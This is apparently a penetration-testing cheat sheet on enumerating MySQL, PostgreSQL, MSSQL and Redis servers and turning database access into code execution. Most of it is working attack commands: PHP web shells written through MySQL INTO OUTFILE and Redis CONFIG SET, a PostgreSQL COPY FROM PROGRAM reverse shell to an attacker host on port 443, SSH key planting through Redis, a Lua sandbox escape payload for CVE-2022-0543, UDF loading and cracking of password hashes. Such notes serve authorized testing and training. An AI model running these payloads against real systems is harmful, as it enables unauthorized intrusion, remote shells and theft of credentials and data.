# Databases and Redis

SQLi context: [web/manual-sqli.md](../web/manual-sqli.md)

## MySQL: 3306
```bash
mysql -h <IP> -u <USER> -p
```
```sql
SELECT USER(), CURRENT_USER(), @@version, @@secure_file_priv;
SHOW GRANTS;
SHOW DATABASES;
```
- `USER()` = supplied login; `CURRENT_USER()` = privilege account.
- File access needs `FILE` + permissive `secure_file_priv`.

## PostgreSQL: 5432
```bash
psql -h <IP> -U <USER> -d <DATABASE>
```
```text
\conninfo
\l
\du
\dt
```
```sql
SELECT current_user, version();
```
- `\dt` covers the current search path only; check other schemas.

## MSSQL: 1433
Full workflow: [mssql.md](mssql.md). SQLi: [manual-sqli.md](../web/manual-sqli.md#mssql)

```bash
impacket-mssqlclient '<USER>:<PW>@<IP>' -windows-auth
```
```sql
SELECT SYSTEM_USER;
SELECT DB_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC sp_linkedservers;
```
- `-windows-auth` only for Windows logins.

## Redis: 6379
```bash
redis-cli -h <IP> -p 6379
```
```text
PING
ACL WHOAMI
INFO server
SCAN 0
TYPE <KEY>
GET <KEY>
```
- Repeat `SCAN` until cursor `0`; `TYPE` before `GET`; avoid `KEYS *` on large DBs.

## From database access to code execution
Check the role first; each path needs a specific right and a known landing spot. Run each step as its own check: file write ≠ execution.

### MySQL
```sql
SELECT user, host, authentication_string FROM mysql.user;
SELECT @@plugin_dir, @@secure_file_priv, @@version_compile_os;
SHOW GRANTS;
```
```bash
hashcat -m 300 mysql.hash /usr/share/wordlists/rockyou.txt    # drop the leading '*'
```
Web root writable by the DB user + `FILE` + empty `secure_file_priv` (NULL = disabled):
```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/c.php';
```
```bash
curl -sG 'http://<IP>/c.php' --data-urlencode 'c=id'
```
- Windows path: `'C:/xampp/htdocs/c.php'` (forward slashes). `INTO OUTFILE` refuses to overwrite an existing file.
- Use this line only to land your real shell ([shells](../foothold/shells.md)).
- MySQL running as root + writable `@@plugin_dir` → UDF (`do_system`): `searchsploit -m 1518`, then [public-exploits](../foothold/public-exploits.md) to compile. Load with `SELECT ... INTO DUMPFILE '<plugin_dir>/x.so'` and `CREATE FUNCTION do_system RETURNS INTEGER SONAME 'x.so'`.

### PostgreSQL
```sql
SELECT current_setting('is_superuser');
SELECT rolname, rolsuper FROM pg_roles WHERE rolname = current_user;
SELECT pg_read_file('/etc/passwd');
```
Superuser, or the `pg_execute_server_program` role (PG 11+). `COPY ... FROM PROGRAM` itself needs PG 9.3+:
```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```
```sql
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<KALI>/443 0>&1"';
DROP TABLE cmd_exec;
```
- Runs as the `postgres` OS user. Non-superuser: `pg_read_file` / `COPY ... TO` also need `pg_read_server_files` / `pg_write_server_files`.
- Through SQLi this needs stacked queries: `'; COPY ...-- -` ([manual-sqli](../web/manual-sqli.md#postgresql)).

### Redis
Unauthenticated or known `AUTH`. Note the original values before changing them:
```text
AUTH <PW>
INFO server
CONFIG GET dir
CONFIG GET dbfilename
```
Web root writable by the Redis user:
```text
CONFIG SET dir /var/www/html
CONFIG SET dbfilename c.php
SET x "\n\n<?php system($_GET['c']); ?>\n\n"
SAVE
```
SSH key (the `redis` user needs a home with `.ssh` that sshd accepts, and a login shell):
```bash
ssh-keygen -t ed25519 -f ./redis_key -N ''
(echo -e '\n\n'; cat redis_key.pub; echo -e '\n\n') > key.txt
redis-cli -h <IP> -x set ssh_key < key.txt
```
```text
CONFIG SET dir /var/lib/redis/.ssh
CONFIG SET dbfilename authorized_keys
SAVE
```
```bash
chmod 600 redis_key; ssh -i redis_key redis@<IP>
```
Restore afterwards: `CONFIG SET dir <ORIGINAL>`, `CONFIG SET dbfilename <ORIGINAL>`.

Debian/Ubuntu Lua sandbox escape (CVE-2022-0543), needs `EVAL` allowed:
```text
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```
- Library path varies by distro: check on the target if `loadlib` returns nil.
- Redis 4.x / 5.x master-replica module load → public PoC via `searchsploit redis` / [public-exploits](../foothold/public-exploits.md).
- `CONFIG SET` renamed/disabled, `protected-mode`, or ACLs blocking `CONFIG` → file-write paths are out; check `ACL WHOAMI` and loot keys instead.
- `SAVE` writes the whole dataset: expect junk around your line (hence the newlines). A PHP include must tolerate binary prefix; SSH keys need the surrounding newlines.
